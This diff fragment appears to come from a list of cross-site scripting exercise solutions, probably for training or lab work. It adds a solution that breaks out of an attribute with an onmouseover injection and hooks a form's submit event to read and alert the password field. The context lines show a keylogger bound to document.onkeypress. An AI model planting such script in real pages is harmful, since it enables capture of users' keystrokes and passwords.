@@ -98,3 +98,19 @@ document.onkeypress = function KeyLogger(inp)
 }
 	
 </script>
+
+
+* Solution 8: Event Listener
+
+" onmouseover="
+
+document.forms[0].onsubmit = function demo ()
+
+{
+	var pass = document.forms[0].elements[1].value;
+	alert (pass);
+}
+	
+
+* Solution 9:
+
